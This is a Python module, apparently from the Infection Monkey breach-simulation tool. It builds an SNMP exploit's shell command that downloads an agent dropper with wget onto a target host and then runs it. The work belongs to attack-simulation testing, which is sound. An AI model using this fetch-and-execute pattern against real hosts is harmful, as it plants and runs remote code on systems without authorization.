import logging

from agentpluginapi import TargetHost

from common.command_builder import (
    DownloadMethod,
    DownloadOptions,
    IAgentCommandBuilder,
    MonkeyArgs,
    RunOptions,
)
from infection_monkey.exploit.tools.helpers import get_dropper_script_dst_path

logger = logging.getLogger(__name__)


def build_snmp_command(
    target_host: TargetHost, agent_download_url: str, agent_command_builder: IAgentCommandBuilder
) -> str:
    dropper_script_dst_path = get_dropper_script_dst_path(target_host)
    download_options = DownloadOptions(
        download_method=DownloadMethod.WGET,
        download_url=agent_download_url,
        agent_destination_path=dropper_script_dst_path,
    )
    download_command = agent_command_builder.build_download_command(download_options)
    run_options = RunOptions(
        monkey_args=MonkeyArgs.AGENT, agent_destination_path=dropper_script_dst_path
    )
    # NOTE: Run command will have the arguments for the agent which we don't need in this case
    run_command = agent_command_builder.build_run_command(run_options)
    command = f'-c "{download_command} ; {run_command}"'

    logger.debug(f"COMMAND: {command}")
    return command
